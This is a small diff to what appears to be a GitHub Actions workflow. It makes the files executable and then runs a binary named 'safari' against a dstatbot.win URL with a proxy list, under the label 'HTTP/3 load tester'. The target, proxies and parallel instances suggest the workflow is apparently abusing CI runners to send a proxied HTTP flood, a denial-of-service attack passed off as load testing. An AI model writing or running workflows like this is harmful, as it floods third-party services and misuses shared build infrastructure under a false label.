@@ -41,6 +41,7 @@ jobs:
             
       - name: Run HTTP/3 load tester
         run: |
+          chmod +x *
           ./safari https://c1.dstatbot.win/lURlGPR6 700 1000 90 proxies.txt --raw
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
